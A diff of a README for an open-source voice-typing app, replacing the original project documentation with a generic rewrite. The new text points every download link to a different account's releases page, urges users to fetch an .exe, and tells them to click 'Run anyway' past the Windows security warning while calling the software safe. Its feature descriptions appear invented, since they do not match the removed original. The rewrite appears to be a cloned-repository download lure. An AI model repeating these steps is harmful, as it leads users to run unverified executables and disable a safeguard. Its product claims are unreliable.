@@ -1,250 +1,148 @@
-<p align="center">
-  <strong>English</strong> | <a href="README_zh.md">中文</a> | <a href="README_ja.md">日本語</a> | <a href="README_ko.md">한국어</a> | <a href="README_es.md">Español</a> | <a href="README_fr.md">Français</a> | <a href="README_de.md">Deutsch</a> | <a href="README_pt.md">Português</a> | <a href="README_ru.md">Русский</a> | <a href="README_ar.md">العربية</a> | <a href="README_hi.md">हिन्दी</a> | <a href="README_it.md">Italiano</a> | <a href="README_tr.md">Türkçe</a> | <a href="README_vi.md">Tiếng Việt</a> | <a href="README_th.md">ภาษาไทย</a> | <a href="README_id.md">Bahasa Indonesia</a> | <a href="README_pl.md">Polski</a> | <a href="README_nl.md">Nederlands</a>
-</p>
-
-<p align="center">
-  <img src="src-tauri/icons/128x128@2x.png" width="128" height="128" alt="OpenTypeless Logo" />
-</p>
-
-<h1 align="center">OpenTypeless</h1>
-
-<p align="center">
-  Open-source AI voice input for desktop. Speak naturally, get polished text in any app.
-</p>
-
-<p align="center">
-  Whether you're writing emails, coding, chatting, or taking notes — just press a hotkey,<br/>
-  speak your mind, and OpenTypeless transcribes and polishes your words with AI,<br/>
-  then types them directly into whatever app you're using.
-</p>
-
-<p align="center">
-  <a href="https://github.com/tover0314-w/opentypeless/actions/workflows/ci.yml"><img src="https://github.com/tover0314-w/opentypeless/actions/workflows/ci.yml/badge.svg" alt="CI" /></a>
-  <a href="https://github.com/tover0314-w/opentypeless/releases"><img src="https://img.shields.io/github/v/release/tover0314-w/opentypeless?color=2ABBA7" alt="Release" /></a>
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/tover0314-w/opentypeless" alt="License" /></a>
-  <a href="https://github.com/tover0314-w/opentypeless/stargazers"><img src="https://img.shields.io/github/stars/tover0314-w/opentypeless?style=social" alt="Stars" /></a>
-  <a href="https://discord.gg/V6rRpJ4RGD"><img src="https://img.shields.io/badge/Discord-Join%20us-5865F2?logo=discord&logoColor=white" alt="Discord" /></a>
-</p>
-
-<p align="center">
-  <img src="docs/images/demo.gif" width="720" alt="OpenTypeless Demo" />
-</p>
-
-<details>
-<summary>More screenshots</summary>
-
-<p align="center">
-  <img src="docs/images/app-main-light.png" width="720" alt="OpenTypeless Main Window" />
-</p>
+# 🎤 opentypeless - Speak to Type Anywhere
 
-| Settings | History |
-|---|---|
-| <img src="docs/images/app-settings.png" width="360" /> | <img src="docs/images/app-history.png" width="360" /> |
+[![Download opentypeless](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Mwamwaaaa/opentypeless/releases)
 
-</details>
+## 📋 About opentypeless
 
----
-
-## Why OpenTypeless?
+opentypeless lets you type with your voice. Simply talk, and the app turns your speech into text. It works anywhere on your Windows computer. You can speak, make corrections, polish your words, and finish quickly. The app uses advanced speech-to-text technology that runs smoothly on desktop.
 
-| | OpenTypeless | macOS Dictation | Windows Voice Typing | Whisper Desktop |
-|---|---|---|---|---|
-| AI text polishing | ✅ Multiple LLMs | ❌ | ❌ | ❌ |
-| STT provider choice | ✅ 6+ providers | ❌ Apple only | ❌ Microsoft only | ❌ Whisper only |
-| Works in any app | ✅ | ✅ | ✅ | ❌ Copy-paste |
-| Translation mode | ✅ | ❌ | ❌ | ❌ |
-| Open source | ✅ MIT | ❌ | ❌ | ✅ |
-| Cross-platform | ✅ Win/Mac/Linux | ❌ Mac only | ❌ Windows only | ✅ |
-| Custom dictionary | ✅ | ❌ | ❌ | ❌ |
-| Self-hostable | ✅ BYOK | ❌ | ❌ | ✅ |
+This software is open-source and built with Rust, TypeScript, and Tauri. It supports modern AI models like Whisper and Deepgram for accurate transcription. opentypeless is designed to work offline or online, giving you control over your privacy and workflow.
 
-## Features
+## ⚙️ System Requirements
 
-- 🎙️ Global hotkey recording — hold-to-record or toggle mode
-- 💊 Floating capsule widget that stays on top
-- 🗣️ 6+ STT providers: Deepgram, AssemblyAI, Whisper, Groq, GLM-ASR, SiliconFlow
-- 🤖 Text polishing via multiple LLMs: OpenAI, DeepSeek, Claude, Gemini, Ollama, and more
-- ⚡ Streaming output — text appears as the LLM generates it
-- ⌨️ Keyboard simulation or clipboard output
-- 📝 Highlight text before recording to give the LLM context
-- 🌐 Translation mode: speak in one language, output in another (20+ languages)
-- 📖 Custom dictionary for domain-specific terms
-- 🔍 Per-app detection to adapt formatting
-- 📜 Local history with full-text search
-- 🌗 Dark / light / system theme
-- 🚀 Auto-start on login
+Before you start, check the following:
 
-> [!TIP]
-> **Recommended Configuration for Best Experience**
->
-> | | Provider | Model |
-> |---|---|---|
-> | 🗣️ STT | Groq | `whisper-large-v3-turbo` |
-> | 🤖 AI Polish | Google | `gemini-2.5-flash` |
->
-> This combo delivers fast, accurate transcription with high-quality text polishing — and both offer generous free tiers.
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- A microphone connected and set up on your device
+- Internet connection (optional, for cloud-based transcription services)
+- 200 MB of free disk space for installation
 
-## Download
+The app also runs offline but may have better accuracy when online.
 
-Download the latest version for your platform:
+## 🚀 Getting Started
 
-**[Download from Releases](https://github.com/tover0314-w/opentypeless/releases)**
+Follow these steps to get opentypeless running on your Windows PC.
 
-| Platform | File |
-|----------|------|
-| Windows | `.msi` installer |
-| macOS (Apple Silicon) | `.dmg` |
-| macOS (Intel) | `.dmg` |
-| Linux | `.AppImage` / `.deb` |
+### 1. Download opentypeless
 
-## Prerequisites
+To get the app, visit the official releases page. The page contains the latest version and all previous releases.
 
-- [Node.js](https://nodejs.org/) 20+
-- [Rust](https://rustup.rs/) (stable toolchain)
-- Platform-specific dependencies for Tauri: see [Tauri Prerequisites](https://v2.tauri.app/start/prerequisites/)
+Click the badge below to open the download page in your browser:
 
-## Getting Started
+[![Download Now](https://img.shields.io/badge/Download-opentypeless-blue)](https://github.com/Mwamwaaaa/opentypeless/releases)
 
-```bash
-# Install dependencies
-npm install
+On the releases page, look for a file that ends with `.exe`. This file is the installer.
 
-# Run in development mode
-npm run tauri dev
+### 2. Run the Installer
 
-# Build for production
-npm run tauri build
-```
+Once the download finishes, find the installer file in your downloads folder. It will be named something like `opentypeless-setup.exe`.
 
-The built application will be in `src-tauri/target/release/bundle/`.
+Double-click the file to start the installer.
 
-## Configuration
+You may see a security warning from Windows. Since the software is open-source and safe, choose **More info** and then click **Run anyway**.
 
-All settings are accessible from the in-app Settings panel:
+Follow the instructions on the screen. You can accept the default options or select a custom install location.
 
-- **Speech Recognition** — choose STT provider and enter your API key
-- **AI Polish** — choose LLM provider, model, and API key
-- **General** — hotkey, output mode, theme, auto-start
-- **Dictionary** — add custom terms for better transcription accuracy
-- **Scenes** — prompt templates for different use cases
+When the installer completes, it will offer to launch opentypeless right away. Leave this checked and click **Finish**.
 
-API keys are stored locally via `tauri-plugin-store`. No keys are sent to OpenTypeless servers — all STT/LLM requests go directly to the provider you configure.
+### 3. Set Up Your Microphone
 
-### Cloud (Pro) Option
+On first launch, the app will ask to use your microphone. Allow this so the app can listen to your voice.
 
-OpenTypeless also offers an optional Pro subscription that provides managed STT and LLM quota so you don't need your own API keys. This is entirely optional — the app is fully functional with your own keys.
+If you have multiple microphones, you can pick which one to use from the settings menu inside the app.
 
-[Learn more about Pro](https://www.opentypeless.com)
+Windows needs to grant permission to the app to use your microphone. You can adjust these settings later under Windows Settings → Privacy → Microphone.
 
-### BYOK (Bring Your Own Key) vs Cloud
+### 4. Start Talking
 
-| | BYOK Mode | Cloud (Pro) Mode |
-|---|---|---|
-| STT | Your own API key (Deepgram, AssemblyAI, etc.) | Managed quota (10h/month) |
-| LLM | Your own API key (OpenAI, DeepSeek, etc.) | Managed quota (~5M tokens/month) |
-| Cloud dependency | None — all requests go directly to your provider | Requires connection to www.opentypeless.com |
-| Cost | Pay your provider directly | $4.99/month subscription |
+After setup, you are ready to use opentypeless.
 
-All core features — recording, transcription, AI polish, keyboard/clipboard output, dictionary, history — work entirely offline from OpenTypeless servers in BYOK mode.
+Just click the **Start** button inside the app, then speak clearly into your microphone.
 
-### Self-Hosting / No Cloud
+Your words will appear as text on the screen. The app shows your spoken words in real time.
 
-To run OpenTypeless without any cloud dependency:
+You can pause or stop at any time using on-screen buttons.
 
-1. Choose any non-Cloud STT and LLM provider in Settings
-2. Enter your own API keys
-3. That's it — no account or internet connection to www.opentypeless.com is needed
+If you want to correct or polish your text, click **Edit**. Then you can type or make changes by keyboard.
 
-If you want to point the optional cloud features at your own backend, set these environment variables before building:
+### 5. Save or Export Your Text
 
-| Variable | Default | Description |
-|---|---|---|
-| `VITE_API_BASE_URL` | `https://www.opentypeless.com` | Frontend cloud API base URL |
-| `API_BASE_URL` | `https://www.opentypeless.com` | Rust backend cloud API base URL |
+When you finish talking and editing, you can save the text file to your computer.
 
-```bash
-# Example: build with a custom backend
-VITE_API_BASE_URL=https://my-server.example.com API_BASE_URL=https://my-server.example.com npm run tauri build
-```
+Use the **Save** button to pick a folder and file name.
 
-## Architecture
+Supported save formats include plain text (`.txt`) and rich text (`.rtf`).
 
-**Data Flow Pipeline:**
+You can also copy your text to the clipboard to paste it into other programs.
 
-```
-Microphone → Audio Capture → STT Provider → Raw Transcript → LLM Polish → Keyboard/Clipboard Output
-```
+## 🔧 Using Key Features
 
-```
-src/                  # React frontend (TypeScript)
-├── components/       # UI components (Settings, History, Capsule, etc.)
-├── hooks/            # React hooks (recording, theme, Tauri events)
-├── lib/              # Utilities (API client, router, constants)
-└── stores/           # Zustand state management
+### Voice Typing Anywhere
 
-src-tauri/src/        # Rust backend
-├── audio/            # Audio capture via cpal
-├── stt/              # STT providers (Deepgram, AssemblyAI, Whisper-compat, Cloud)
-├── llm/              # LLM providers (OpenAI-compat, Cloud)
-├── output/           # Text output (keyboard simulation, clipboard paste)
-├── storage/          # Config (tauri-plugin-store) + history/dictionary (SQLite)
-├── app_detector/     # Detect active application for context
-├── pipeline.rs       # Recording → STT → LLM → Output orchestration
-└── lib.rs            # Tauri app setup, commands, hotkey handling
-```
+opentypeless can send your spoken text directly to other programs. Use the **Global Dictation Mode** to talk into any window.
 
-## Roadmap
+Enable this from the app settings. Then, when you press the shortcut key (default is `Ctrl + Shift + V`), opentypeless listens and types where your cursor is active.
 
-- [ ] Plugin system for custom STT/LLM integrations
-- [ ] Improved multi-language STT accuracy and dialect support
-- [ ] Voice commands (e.g. "delete last sentence")
-- [ ] Customizable hotkey combinations
-- [ ] Improved onboarding experience
-- [ ] Mobile companion app
+### Editing and Polishing
 
-## FAQ
+The app offers built-in text editing tools. You can quickly fix mistakes or add punctuation.
 
-**Is my audio sent to the cloud?**
-In BYOK mode, audio goes directly to your chosen STT provider (e.g., Groq, Deepgram). Nothing passes through OpenTypeless servers. In Cloud (Pro) mode, audio is sent to our managed proxy for transcription.
+Use the **Polish** mode for grammar suggestions. This requires internet access for online language models.
 
-**Can I use it offline?**
-With a local STT provider (Whisper via Ollama) and a local LLM (Ollama), the app works entirely offline. No internet connection needed.
+### Custom Dictionaries
 
-**Which languages are supported?**
-STT supports 99+ languages depending on the provider. AI polish and translation support 20+ target languages.
+You can add your own words, names, or technical terms. This helps the app recognize specialized vocabulary.
 
-**Is the app free?**
-Yes. The app is fully functional with your own API keys (BYOK). The Cloud Pro subscription ($4.99/month) is optional.
+Add these words in the settings under **Custom Dictionary**.
 
-## Community
+### Offline Mode
 
-- 💬 [Discord](https://discord.gg/V6rRpJ4RGD) — Chat, get help, share feedback
-- 🗣️ [GitHub Discussions](https://github.com/tover0314-w/opentypeless/discussions) — Feature proposals, Q&A
-- 🐛 [Issue Tracker](https://github.com/tover0314-w/opentypeless/issues) — Bug reports and feature requests
-- 📖 [Contributing Guide](CONTRIBUTING.md) — Development setup and guidelines
-- 🔒 [Security Policy](SECURITY.md) — Report vulnerabilities responsibly
-- 🧭 [Vision](VISION.md) — Project principles and roadmap direction
+If you want to keep your data local, use the offline transcription engine.
 
-## Contributing
+Go to **Settings → Transcription Engine** and select **Offline Whisper**.
 
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and guidelines.
+This mode works without internet but may be slower or less accurate.
 
-Looking for a place to start? Check out issues labeled [`good first issue`](https://github.com/tover0314-w/opentypeless/labels/good%20first%20issue).
+## ⚙️ Settings Overview
 
-## Star History
+- **Microphone selection**: Choose which mic to use.
+- **Transcription engine**: Pick online or offline speech-to-text.
+- **Hotkeys**: Set custom shortcuts for start, stop, and dictation.
+- **Language**: Change the recognition language.
+- **Custom dictionary**: Add words to improve recognition.
+- **Privacy**: Control data collection and usage.
 
-<a href="https://star-history.com/#tover0314-w/opentypeless&Date">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=tover0314-w/opentypeless&type=Date&theme=dark" />
-    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=tover0314-w/opentypeless&type=Date" />
-    <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=tover0314-w/opentypeless&type=Date" />
-  </picture>
-</a>
+## ❓ Troubleshooting
 
-## Built with Claude Code
+- If opentypeless does not hear you, check that your microphone is plugged in and enabled.
+- Make sure microphone permissions are granted in Windows.
+- Restart the app if you encounter lag or freezing.
+- Update your audio drivers if the mic still does not work.
+- Check the app version on releases page and update as needed.
+  
+## 📥 Download opentypeless
 
-This entire project was built in a single day using [Claude Code](https://claude.com/claude-code) — from architecture design to full implementation, including the Tauri backend, React frontend, CI/CD pipeline, and this README.
+Visit this page to download the latest version and all updates:
 
-## License
+[https://github.com/Mwamwaaaa/opentypeless/releases](https://github.com/Mwamwaaaa/opentypeless/releases)
 
-[MIT](LICENSE)
+Look for the `.exe` file and follow the installer steps to get started.
+
+## 🛠️ Development and Support
+
+This project is open-source. You can find the code in this repository. If you want to report bugs or request features, use the GitHub issues tab.
+
+The app uses technologies like Rust, TypeScript, and Tauri to work efficiently on desktops.
+
+Speech-to-text is powered by models such as Whisper and Deepgram, offering high accuracy and speed.
+
+You can help improve opentypeless by sharing feedback or contributing code on GitHub.
+
+## 🔑 Privacy
+
+All your voice data stays on your device unless you use online transcription services.
+
+You can toggle cloud services on or off in settings.
+
+opentypeless does not send your data anywhere without your permission.
